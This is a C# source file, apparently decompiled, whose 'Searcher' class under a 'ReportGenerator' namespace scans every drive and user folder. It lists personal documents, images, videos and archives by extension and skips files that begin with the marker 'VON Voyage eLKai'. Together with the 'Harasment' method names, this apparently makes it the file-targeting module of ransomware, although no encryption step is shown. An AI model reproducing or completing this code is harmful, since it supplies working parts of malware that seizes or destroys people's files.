using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;

namespace ReportGenerator;

public class Searcher
{
	public static List<string> GetHarasmentList()
	{
		List<string> list = new List<string>();
		string[] logicalDrives = Directory.GetLogicalDrives();
		foreach (string text in logicalDrives)
		{
			try
			{
				if (text.Equals("C:\\"))
				{
					string[] directories = Directory.GetDirectories("C:\\Users");
					foreach (string path in directories)
					{
						list.AddRange(GetHarasmentList(path));
					}
				}
				else
				{
					string[] directories2 = Directory.GetDirectories(text);
					foreach (string path2 in directories2)
					{
						list.AddRange(GetHarasmentList(path2));
					}
				}
			}
			catch (IOException)
			{
			}
		}
		return SortHarasmentDirectoryList(list);
	}

	private static List<string> GetHarasmentList(string path)
	{
		List<string> list = new List<string>();
		try
		{
			string[] directories = Directory.GetDirectories(path);
			if (directories.Length == 0)
			{
				return list;
			}
			list.AddRange(directories.ToList());
			string[] array = directories;
			foreach (string path2 in array)
			{
				list.AddRange(GetHarasmentList(path2));
			}
			return list;
		}
		catch (UnauthorizedAccessException)
		{
			return list;
		}
	}

	private static List<string> SortHarasmentDirectoryList(List<string> unsortedList)
	{
		List<string> list = new List<string>();
		while (unsortedList.Count != 0)
		{
			int num = 0;
			string item = "";
			foreach (string unsorted in unsortedList)
			{
				int num2 = 0;
				char[] array = unsorted.ToCharArray();
				char[] array2 = array;
				foreach (char c in array2)
				{
					if (c == '\\')
					{
						num2++;
					}
				}
				if (num2 > num)
				{
					num = num2;
					item = unsorted;
				}
			}
			list.Add(item);
			unsortedList.Remove(item);
		}
		return list;
	}

	public static List<string> GetAvilibleHarasmentFiles(List<string> sortedDirectoryList)
	{
		List<string> list = new List<string>();
		foreach (string sortedDirectory in sortedDirectoryList)
		{
			try
			{
				string[] files = Directory.GetFiles(sortedDirectory);
				string[] array = files;
				foreach (string text in array)
				{
					FileStream fileStream = File.OpenRead(text);
					byte[] array2 = new byte[16];
					fileStream.Read(array2, 0, 16);
					fileStream.Close();
					string value = "VON Voyage eLKai";
					string text2 = "";
					byte[] array3 = array2;
					for (int j = 0; j < array3.Length; j++)
					{
						char c = (char)array3[j];
						text2 += c;
					}
					if (text2.Equals(value))
					{
						continue;
					}
					string text3 = text.Split(new char[1] { '.' })[^1].ToLower();
					string[] array4 = new string[24]
					{
						"txt", "jpeg", "jpg", "avi", "mp3", "mp4", "gif", "png", "doc", "docx",
						"xml", "xlsx", "xls", "cdr", "psd", "ppt", "pptx", "pdf", "flv", "rtf",
						"wmv", "rar", "zip", "mov"
					};
					bool flag = false;
					string[] array5 = array4;
					foreach (string value2 in array5)
					{
						if (text3.Equals(value2))
						{
							flag = true;
						}
					}
					if (flag)
					{
						list.Add(text);
					}
				}
			}
			catch (Exception)
			{
			}
		}
		return list;
	}
}
